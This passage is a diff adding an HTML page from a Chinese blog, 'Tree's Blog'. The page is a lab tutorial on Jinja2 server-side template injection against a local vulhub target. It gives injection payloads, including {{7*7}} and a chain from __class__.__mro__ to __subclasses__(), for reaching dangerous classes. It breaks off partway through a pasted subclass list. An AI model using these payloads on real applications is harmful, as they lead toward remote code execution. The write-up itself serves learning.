@@ -1,0 +1,347 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>ssti学习 | Tree's Blog</title><meta name="author" content="Tree"><meta name="copyright" content="Tree"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="ssti学习环境搭建我这里用了vulhub+docker-compose搭建的环境 下载好docker、docker-compose和vulhub后，找到ssti对应文件夹，打开终端 docker-compose build docker-compose up -d  然后用浏览器访问本机的8000端口  漏洞检验页面啥也没有，只能去看看源码了  从源码得知，参数是name，用get方法传入参数">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ssti学习">
+<meta property="og:url" content="http://example.com/2021/12/16/ssti%E5%AD%A6%E4%B9%A0/index.html">
+<meta property="og:site_name" content="Tree&#39;s Blog">
+<meta property="og:description" content="ssti学习环境搭建我这里用了vulhub+docker-compose搭建的环境 下载好docker、docker-compose和vulhub后，找到ssti对应文件夹，打开终端 docker-compose build docker-compose up -d  然后用浏览器访问本机的8000端口  漏洞检验页面啥也没有，只能去看看源码了  从源码得知，参数是name，用get方法传入参数">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://raw.githubusercontent.com/todis21/image/main/img/wallhaven-4yy7e7_1920x1080.png">
+<meta property="article:published_time" content="2021-12-16T14:31:17.000Z">
+<meta property="article:modified_time" content="2021-12-26T06:31:50.000Z">
+<meta property="article:author" content="Tree">
+<meta property="article:tag" content="web">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/todis21/image/main/img/wallhaven-4yy7e7_1920x1080.png"><link rel="shortcut icon" href="/img/favicon.jfif"><link rel="canonical" href="http://example.com/2021/12/16/ssti%E5%AD%A6%E4%B9%A0/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: undefined,
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'ssti学习',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2021-12-26 14:31:50'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+    win.getCSS = (url,id = false) => new Promise((resolve, reject) => {
+      const link = document.createElement('link')
+      link.rel = 'stylesheet'
+      link.href = url
+      if (id) link.id = id
+      link.onerror = reject
+      link.onload = link.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        link.onload = link.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(link)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><link rel="stylesheet" href="/css/bg.css"><meta name="generator" content="Hexo 6.3.0"></head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/favicon.jfif" onerror="onerror=null;src='/img/404.png'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">39</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">8</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-graduation-cap"></i><span> 博文</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/links/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://raw.githubusercontent.com/todis21/image/main/img/wallhaven-4yy7e7_1920x1080.png')"><nav id="nav"><span id="blog-info"><a href="/" title="Tree's Blog"><span class="site-name">Tree's Blog</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-graduation-cap"></i><span> 博文</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/links/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">ssti学习</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2021-12-16T14:31:17.000Z" title="发表于 2021-12-16 22:31:17">2021-12-16</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2021-12-26T06:31:50.000Z" title="更新于 2021-12-26 14:31:50">2021-12-26</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="ssti学习"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="ssti学习"><a href="#ssti学习" class="headerlink" title="ssti学习"></a>ssti学习</h1><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>我这里用了vulhub+docker-compose搭建的环境</p>
+<p>下载好docker、docker-compose和vulhub后，找到ssti对应文件夹，打开终端</p>
+<pre><code>docker-compose build
+docker-compose up -d
+</code></pre>
+<p>然后用浏览器访问本机的8000端口</p>
+<p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211216223957040.png" alt="image-20211216223957040"></p>
+<h2 id="漏洞检验"><a href="#漏洞检验" class="headerlink" title="漏洞检验"></a>漏洞检验</h2><p>页面啥也没有，只能去看看源码了</p>
+<p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211216224756010.png" alt="image-20211216224756010"></p>
+<p>从源码得知，参数是name，用get方法传入参数</p>
+<hr>
+<p>假设没看源码，需要给参数传入一些东西来检验它存不存在ssti</p>
+<p>为了方便，这里用burpsuite抓包</p>
+<p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211216225747049.png" alt="image-20211216225747049"></p>
+<p>传入的是</p>
+<pre><code>?name=&#123;&#123;7*7&#125;&#125;
+</code></pre>
+<p>页面返回<code>49</code>，说明这里存在ssti漏洞,而且还是jinja2的</p>
+<p><img src="https://p5.ssl.qhimg.com/t01a66955048c86d5b6.png" alt="1"></p>
+<h2 id="漏洞利用套路"><a href="#漏洞利用套路" class="headerlink" title="漏洞利用套路"></a>漏洞利用套路</h2><p>基本思路就是利用 python 中的<code>魔术方法</code>找到自己要用的函数</p>
+<ul>
+<li><p>dict: 保存类实例或对象实例的属性变量键值对字典</p>
+</li>
+<li><p>class: 返回调用的参数类型</p>
+</li>
+<li><p>mro: 返回一个包含对象所继承的基类元组，方法在解析时按照元组的顺序解析</p>
+</li>
+<li><p>bases: 返回类型列表</p>
+</li>
+<li><p>subclasses: 返回object的子类</p>
+</li>
+<li><p>init: 类的初始化方法</p>
+</li>
+<li><p>globals: 函数会以字典类型返回当前位置的全部全局变量 与 func_globals 等价</p>
+<pre><code>base和 mro都是用来寻找基类的。
+</code></pre>
+</li>
+</ul>
+<h3 id="第一步"><a href="#第一步" class="headerlink" title="第一步"></a>第一步</h3><p>使用魔术方法进行函数解析，再获取基本类：</p>
+<pre><code>&#39;&#39;.__class__.__mro__[2]
+&#123;&#125;.__class__.__bases__[0]
+().__class__.__bases__[0]
+[].__class__.__bases__[0]
+request.__class__.__mro__[8] //针对jinjia2/flask为[9]适用
+</code></pre>
+<p><code>[]</code>内的数字不是固定的，这一步主要是找到object类</p>
+<pre><code>?name=&#123;&#123;''.__class__.__mro__&#125;&#125;
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211217102722307.png" alt="image-20211217102722307"></p>
+<p>所以第一步用的payload是</p>
+<pre><code>?name=&#123;&#123;''.__class__.__mro__[1]&#125;&#125;
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211217102839137.png" alt="image-20211217102839137"></p>
+<h3 id="第二步"><a href="#第二步" class="headerlink" title="第二步"></a>第二步</h3><p>获取基本类后，继续向下获取基本类 object 的子类：</p>
+<pre><code>?name=&#123;&#123;''.__class__.__mro__[1].__subclasses__()&#125;&#125;
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211217103214134.png" alt="image-20211217103214134"></p>
+<p>这里得到的东西有点眼花缭乱，但是不要慌，找准目标，什么都好说</p>
+<p>这一步我们要找的是<code>&lt;class &#39;warnings.catch_warnings&#39;&gt;</code>,返回的类太多，很难找到它对应的下标，一个个数，不太现实</p>
+<p>这里写个小小脚本</p>
+<pre><code class="python">str=&quot;&lt;class &#39;type&#39;&gt;, &lt;class &#39;weakref&#39;&gt;, &lt;class &#39;weakcallableproxy&#39;&gt;, &lt;class &#39;weakproxy&#39;&gt;, &lt;class &#39;int&#39;&gt;, &lt;class &#39;bytearray&#39;&gt;, &lt;class &#39;bytes&#39;&gt;, &lt;class &#39;list&#39;&gt;, &lt;class &#39;NoneType&#39;&gt;, &lt;class &#39;NotImplementedType&#39;&gt;, &lt;class &#39;traceback&#39;&gt;, &lt;class &#39;super&#39;&gt;, &lt;class &#39;range&#39;&gt;, &lt;class &#39;dict&#39;&gt;, &lt;class &#39;dict_keys&#39;&gt;, &lt;class &#39;dict_values&#39;&gt;, &lt;class &#39;dict_items&#39;&gt;, &lt;class &#39;odict_iterator&#39;&gt;, &lt;class &#39;set&#39;&gt;, &lt;class &#39;str&#39;&gt;, &lt;class &#39;slice&#39;&gt;, &lt;class &#39;staticmethod&#39;&gt;, &lt;class &#39;complex&#39;&gt;, &lt;class &#39;float&#39;&gt;, &lt;class &#39;frozenset&#39;&gt;, &lt;class &#39;property&#39;&gt;, &lt;class &#39;managedbuffer&#39;&gt;, &lt;class &#39;memoryview&#39;&gt;, &lt;class &#39;tuple&#39;&gt;, &lt;class &#39;enumerate&#39;&gt;, &lt;class &#39;reversed&#39;&gt;, &lt;class &#39;stderrprinter&#39;&gt;, &lt;class &#39;code&#39;&gt;, &lt;class &#39;frame&#39;&gt;, &lt;class &#39;builtin_function_or_method&#39;&gt;, &lt;class &#39;method&#39;&gt;, &lt;class &#39;function&#39;&gt;, &lt;class &#39;mappingproxy&#39;&gt;, &lt;class &#39;generator&#39;&gt;, &lt;class &#39;getset_descriptor&#39;&gt;, &lt;class &#39;wrapper_descriptor&#39;&gt;, &lt;class &#39;method-wrapper&#39;&gt;, &lt;class &#39;ellipsis&#39;&gt;, &lt;class &#39;member_descriptor&#39;&gt;, &lt;class &#39;types.SimpleNamespace&#39;&gt;, &lt;class &#39;PyCapsule&#39;&gt;, &lt;class &#39;longrange_iterator&#39;&gt;, &lt;class &#39;cell&#39;&gt;, &lt;class &#39;instancemethod&#39;&gt;, &lt;class &#39;classmethod_descriptor&#39;&gt;, &lt;class &#39;method_descriptor&#39;&gt;, &lt;class &#39;callable_iterator&#39;&gt;, &lt;class &#39;iterator&#39;&gt;, &lt;class &#39;coroutine&#39;&gt;, &lt;class &#39;coroutine_wrapper&#39;&gt;, &lt;class &#39;EncodingMap&#39;&gt;, &lt;class &#39;fieldnameiterator&#39;&gt;, &lt;class &#39;formatteriterator&#39;&gt;, &lt;class &#39;filter&#39;&gt;, &lt;class &#39;map&#39;&gt;, &lt;class &#39;zip&#39;&gt;, &lt;class &#39;moduledef&#39;&gt;, &lt;class &#39;module&#39;&gt;, &lt;class &#39;BaseException&#39;&gt;, &lt;class &#39;_frozen_importlib._ModuleLock&#39;&gt;, &lt;class &#39;_frozen_importlib._DummyModuleLock&#39;&gt;, &lt;class &#39;_frozen_importlib._ModuleLockManager&#39;&gt;, &lt;class &#39;_frozen_importlib._installed_safely&#39;&gt;, &lt;class &#39;_frozen_importlib.ModuleSpec&#39;&gt;, &lt;class &#39;_frozen_importlib.BuiltinImporter&#39;&gt;, &lt;class &#39;classmethod&#39;&gt;, &lt;class &#39;_frozen_importlib.FrozenImporter&#39;&gt;, &lt;class &#39;_frozen_importlib._ImportLockContext&#39;&gt;, &lt;class &#39;_thread._localdummy&#39;&gt;, &lt;class &#39;_thread._local&#39;&gt;, &lt;class &#39;_thread.lock&#39;&gt;, &lt;class &#39;_thread.RLock&#39;&gt;, &lt;class &#39;_frozen_importlib_external.WindowsRegistryFinder&#39;&gt;, &lt;class &#39;_frozen_importlib_external._LoaderBasics&#39;&gt;, &lt;class &#39;_frozen_importlib_external.FileLoader&#39;&gt;, &lt;class &#39;_frozen_importlib_external._NamespacePath&#39;&gt;, &lt;class &#39;_frozen_importlib_external._NamespaceLoader&#39;&gt;, &lt;class &#39;_frozen_importlib_external.PathFinder&#39;&gt;, &lt;class &#39;_frozen_importlib_external.FileFinder&#39;&gt;, &lt;class &#39;_io._IOBase&#39;&gt;, &lt;class &#39;_io._BytesIOBuffer&#39;&gt;, &lt;class &#39;_io.IncrementalNewlineDecoder&#39;&gt;, &lt;class &#39;posix.ScandirIterator&#39;&gt;, &lt;class &#39;posix.DirEntry&#39;&gt;, &lt;class &#39;zipimport.zipimporter&#39;&gt;, &lt;class &#39;codecs.Codec&#39;&gt;, &lt;class &#39;codecs.IncrementalEncoder&#39;&gt;, &lt;class &#39;codecs.IncrementalDecoder&#39;&gt;, &lt;class &#39;codecs.StreamReaderWriter&#39;&gt;, &lt;class &#39;codecs.StreamRecoder&#39;&gt;, &lt;class &#39;_weakrefset._IterationGuard&#39;&gt;, &lt;class &#39;_weakrefset.WeakSet&#39;&gt;, &lt;class &#39;abc.ABC&#39;&gt;, &lt;class &#39;collections.abc.Hashable&#39;&gt;, &lt;class &#39;collections.abc.Awaitable&#39;&gt;, &lt;class &#39;collections.abc.AsyncIterable&#39;&gt;, &lt;class &#39;async_generator&#39;&gt;, &lt;class &#39;collections.abc.Iterable&#39;&gt;, &lt;class &#39;bytes_iterator&#39;&gt;, &lt;class &#39;bytearray_iterator&#39;&gt;, &lt;class &#39;dict_keyiterator&#39;&gt;, &lt;class &#39;dict_valueiterator&#39;&gt;, &lt;class &#39;dict_itemiterator&#39;&gt;, &lt;class &#39;list_iterator&#39;&gt;, &lt;class &#39;list_reverseiterator&#39;&gt;, &lt;class &#39;range_iterator&#39;&gt;, &lt;class &#39;set_iterator&#39;&gt;, &lt;class &#39;str_iterator&#39;&gt;, &lt;class &#39;tuple_iterator&#39;&gt;, &lt;class &#39;collections.abc.Sized&#39;&gt;, &lt;class &#39;collections.abc.Container&#39;&gt;, &lt;class &#39;collections.abc.Callable&#39;&gt;, &lt;class &#39;os._wrap_close&#39;&gt;, &lt;class &#39;_sitebuiltins.Quitter&#39;&gt;, &lt;class &#39;_sitebuiltins._Printer&#39;&gt;, &lt;class &#39;_sitebuiltins._Helper&#39;&gt;, &lt;class &#39;types.DynamicClassAttribute&#39;&gt;, &lt;class &#39;functools.partial&#39;&gt;, &lt;class &#39;functools._lru_cache_wrapper&#39;&gt;, &lt;class &#39;operator.itemgetter&#39;&gt;, &lt;class &#39;operator.attrgetter&#39;&gt;, &lt;class &#39;operator.methodcaller&#39;&gt;, &lt;class &#39;itertools.accumulate&#39;&gt;, &lt;class &#39;itertools.combinations&#39;&gt;, &lt;class &#39;itertools.combinations_with_replacement&#39;&gt;, &lt;class &#39;itertools.cycle&#39;&gt;, &lt;class &#39;itertools.dropwhile&#39;&gt;, &lt;class &#39;itertools.takewhile&#39;&gt;, &lt;class &#39;itertools.islice&#39;&gt;, &lt;class &#39;itertools.starmap&#39;&gt;, &lt;class &#39;itertools.chain&#39;&gt;, &lt;class &#39;itertools.compress&#39;&gt;, &lt;class &#39;itertools.filterfalse&#39;&gt;, &lt;class &#39;itertools.count&#39;&gt;, &lt;class &#39;itertools.zip_longest&#39;&gt;, &lt;class &#39;itertools.permutations&#39;&gt;, &lt;class &#39;itertools.product&#39;&gt;, &lt;class &#39;itertools.repeat&#39;&gt;, &lt;class &#39;itertools.groupby&#39;&gt;, &lt;class &#39;itertools._grouper&#39;&gt;, &lt;class &#39;itertools._tee&#39;&gt;, &lt;class &#39;itertools._tee_dataobject&#39;&gt;, &lt;class &#39;reprlib.Repr&#39;&gt;, &lt;class &#39;collections.deque&#39;&gt;, &lt;class &#39;_collections._deque_iterator&#39;&gt;, &lt;class &#39;_collections._deque_reverse_iterator&#39;&gt;, &lt;class &#39;collections._Link&#39;&gt;, &lt;class &#39;weakref.finalize._Info&#39;&gt;, &lt;class &#39;weakref.finalize&#39;&gt;, &lt;class &#39;functools.partialmethod&#39;&gt;, &lt;class &#39;types._GeneratorWrapper&#39;&gt;, &lt;class &#39;enum.auto&#39;&gt;, &lt;enum &#39;Enum&#39;&gt;, &lt;class &#39;_sre.SRE_Pattern&#39;&gt;, &lt;class &#39;_sre.SRE_Match&#39;&gt;, &lt;class &#39;_sre.SRE_Scanner&#39;&gt;, &lt;class &#39;sre_parse.Pattern&#39;&gt;, &lt;class &#39;sre_parse.SubPattern&#39;&gt;, &lt;class &#39;sre_parse.Tokenizer&#39;&gt;, &lt;class &#39;re.Scanner&#39;&gt;, &lt;class &#39;warnings.WarningMessage&#39;&gt;, &lt;class &#39;warnings.catch_warnings&#39;&gt;, &lt;class &#39;tokenize.Untokenizer&#39;&gt;, &lt;class &#39;traceback.FrameSummary&#39;&gt;, &lt;class &#39;traceback.TracebackException&#39;&gt;, &lt;class &#39;_hashlib.HASH&#39;&gt;, &lt;class &#39;_blake2.blake2b&#39;&gt;, &lt;class &#39;_blake2.blake2s&#39;&gt;, &lt;class &#39;_sha3.sha3_224&#39;&gt;, &lt;class &#39;_sha3.sha3_256&#39;&gt;, &lt;class &#39;_sha3.sha3_384&#39;&gt;, &lt;class &#39;_sha3.sha3_512&#39;&gt;, &lt;class &#39;_sha3.shake_128&#39;&gt;, &lt;class &#39;_sha3.shake_256&#39;&gt;, &lt;class &#39;_random.Random&#39;&gt;, &lt;class &#39;select.poll&#39;&gt;, &lt;class &#39;select.epoll&#39;&gt;, &lt;class &#39;selectors.BaseSelector&#39;&gt;, &lt;class &#39;_socket.socket&#39;&gt;, &lt;class &#39;datetime.date&#39;&gt;, &lt;class &#39;datetime.timedelta&#39;&gt;, &lt;class &#39;datetime.time&#39;&gt;, &lt;class &#39;datetime.tzinfo&#39;&gt;, &lt;class &#39;urllib.parse._ResultMixinStr&#39;&gt;, &lt;class &#39;urllib.parse._ResultMixinBytes&#39;&gt;, &lt;class &#39;urllib.parse._NetlocResultMixinBase&#39;&gt;, &lt;class &#39;calendar._localized_month&#39;&gt;, &lt;class &#39;calendar._localized_day&#39;&gt;, &lt;class &#39;calendar.Calendar&#39;&gt;, &lt;class &#39;calendar.different_locale&#39;&gt;, &lt;class &#39;email._parseaddr.AddrlistClass&#39;&gt;, &lt;class &#39;Struct&#39;&gt;, &lt;class &#39;string.Template&#39;&gt;, &lt;class &#39;string.Formatter&#39;&gt;, &lt;class &#39;email.charset.Charset&#39;&gt;, &lt;class &#39;_ast.AST&#39;&gt;, &lt;class &#39;ast.NodeVisitor&#39;&gt;, &lt;class &#39;dis.Bytecode&#39;&gt;, &lt;class &#39;inspect.BlockFinder&#39;&gt;, &lt;class &#39;inspect._void&#39;&gt;, &lt;class &#39;inspect._empty&#39;&gt;, &lt;class &#39;inspect.Parameter&#39;&gt;, &lt;class &#39;inspect.BoundArguments&#39;&gt;, &lt;class &#39;inspect.Signature&#39;&gt;, &lt;class &#39;threading._RLock&#39;&gt;, &lt;class &#39;threading.Condition&#39;&gt;, &lt;class &#39;threading.Semaphore&#39;&gt;, &lt;class &#39;threading.Event&#39;&gt;, &lt;class &#39;threading.Barrier&#39;&gt;, &lt;class &#39;threading.Thread&#39;&gt;, &lt;class &#39;logging.LogRecord&#39;&gt;, &lt;class &#39;logging.PercentStyle&#39;&gt;, &lt;class &#39;logging.Formatter&#39;&gt;, &lt;class &#39;logging.BufferingFormatter&#39;&gt;, &lt;class &#39;logging.Filter&#39;&gt;, &lt;class &#39;logging.Filterer&#39;&gt;, &lt;class &#39;logging.PlaceHolder&#39;&gt;, &lt;class &#39;logging.Manager&#39;&gt;, &lt;class &#39;logging.LoggerAdapter&#39;&gt;, &lt;class &#39;textwrap.TextWrapper&#39;&gt;, &lt;class &#39;__future__._Feature&#39;&gt;, &lt;class &#39;importlib.abc.Finder&#39;&gt;, &lt;class &#39;importlib.abc.Loader&#39;&gt;, &lt;class &#39;contextlib.ContextDecorator&#39;&gt;, &lt;class &#39;zlib.Compress&#39;&gt;, &lt;class &#39;zlib.Decompress&#39;&gt;, &lt;class &#39;_bz2.BZ2Compressor&#39;&gt;, &lt;class &#39;_bz2.BZ2Decompressor&#39;&gt;, &lt;class &#39;_lzma.LZMACompressor&#39;&gt;, &lt;class &#39;_lzma.LZMADecompressor&#39;&gt;, &lt;class &#39;zipfile.ZipInfo&#39;&gt;, &lt;class &#39;zipfile._ZipDecrypter&#39;&gt;, &lt;class &#39;zipfile.LZMACompressor&#39;&gt;, &lt;class &#39;zipfile.LZMADecompressor&#39;&gt;, &lt;class &#39;zipfile._SharedFile&#39;&gt;, &lt;class &#39;zipfile._Tellable&#39;&gt;, &lt;class &#39;zipfile.ZipFile&#39;&gt;, &lt;class &#39;pkgutil.ImpImporter&#39;&gt;, &lt;class &#39;pkgutil.ImpLoader&#39;&gt;, &lt;class &#39;subprocess.CompletedProcess&#39;&gt;, &lt;class &#39;subprocess.Popen&#39;&gt;, &lt;class &#39;pyexpat.xmlparser&#39;&gt;, &lt;class &#39;plistlib.Data&#39;&gt;, &lt;class &#39;plistlib._PlistParser&#39;&gt;, &lt;class &#39;plistlib._DumbXMLWriter&#39;&gt;, &lt;class &#39;plistlib._BinaryPlistParser&#39;&gt;, &lt;class &#39;plistlib._BinaryPlistWriter&#39;&gt;, &lt;class &#39;email.header.Header&#39;&gt;, &lt;class &#39;email.header._ValueFormatter&#39;&gt;, &lt;class &#39;email._policybase._PolicyBase&#39;&gt;, &lt;class &#39;email.feedparser.BufferedSubFile&#39;&gt;, &lt;class &#39;email.feedparser.FeedParser&#39;&gt;, &lt;class &#39;email.parser.Parser&#39;&gt;, &lt;class &#39;email.parser.BytesParser&#39;&gt;, &lt;class &#39;tempfile._RandomNameSequence&#39;&gt;, &lt;class &#39;tempfile._TemporaryFileCloser&#39;&gt;, &lt;class &#39;tempfile._TemporaryFileWrapper&#39;&gt;, &lt;class &#39;tempfile.SpooledTemporaryFile&#39;&gt;, &lt;class &#39;tempfile.TemporaryDirectory&#39;&gt;, &lt;class &#39;pkg_resources.extern.VendorImporter&#39;&gt;, &lt;class &#39;pkg_resources._vendor.six._LazyDescr&#39;&gt;, &lt;class &#39;pkg_resources._vendor.six._SixMetaPathImporter&#39;&gt;, &lt;class &#39;pkg_resources._vendor.six._LazyDescr&#39;&gt;, &lt;class &#39;pkg_resources._vendor.six._SixMetaPathImporter&#39;&gt;, &lt;class &#39;pkg_resources._vendor.appdirs.AppDirs&#39;&gt;, &lt;class &#39;pkg_resources.extern.packaging._structures.Infinity&#39;&gt;, &lt;class &#39;pkg_resources.extern.packaging._structures.NegativeInfinity&#39;&gt;, &lt;class &#39;pkg_resources.extern.packaging.version._BaseVersion&#39;&gt;, &lt;class &#39;pkg_resources.extern.packaging.specifiers.BaseSpecifier&#39;&gt;, &lt;class &#39;pprint._safe_key&#39;&gt;, &lt;class &#39;pprint.PrettyPrinter&#39;&gt;, &lt;class &#39;pkg_resources._vendor.pyparsing._Constants&#39;&gt;, &lt;class &#39;pkg_resources._vendor.pyparsing._ParseResultsWithOffset&#39;&gt;, &lt;class &#39;pkg_resources._vendor.pyparsing.ParseResults&#39;&gt;, &lt;class &#39;pkg_resources._vendor.pyparsing.ParserElement._UnboundedCache&#39;&gt;, &lt;class &#39;pkg_resources._vendor.pyparsing.ParserElement._FifoCache&#39;&gt;, &lt;class &#39;pkg_resources._vendor.pyparsing.ParserElement&#39;&gt;, &lt;class &#39;pkg_resources._vendor.pyparsing._NullToken&#39;&gt;, &lt;class &#39;pkg_resources._vendor.pyparsing.OnlyOnce&#39;&gt;, &lt;class &#39;pkg_resources._vendor.pyparsing.pyparsing_common&#39;&gt;, &lt;class &#39;pkg_resources.extern.packaging.markers.Node&#39;&gt;, &lt;class &#39;pkg_resources.extern.packaging.markers.Marker&#39;&gt;, &lt;class &#39;pkg_resources.extern.packaging.requirements.Requirement&#39;&gt;, &lt;class &#39;pkg_resources.IMetadataProvider&#39;&gt;, &lt;class &#39;pkg_resources.WorkingSet&#39;&gt;, &lt;class &#39;pkg_resources.Environment&#39;&gt;, &lt;class &#39;pkg_resources.ResourceManager&#39;&gt;, &lt;class &#39;pkg_resources.NullProvider&#39;&gt;, &lt;class &#39;pkg_resources.NoDists&#39;&gt;, &lt;class &#39;pkg_resources.EntryPoint&#39;&gt;, &lt;class &#39;pkg_resources.Distribution&#39;&gt;, &lt;class &#39;gunicorn.pidfile.Pidfile&#39;&gt;, &lt;class &#39;CArgObject&#39;&gt;, &lt;class 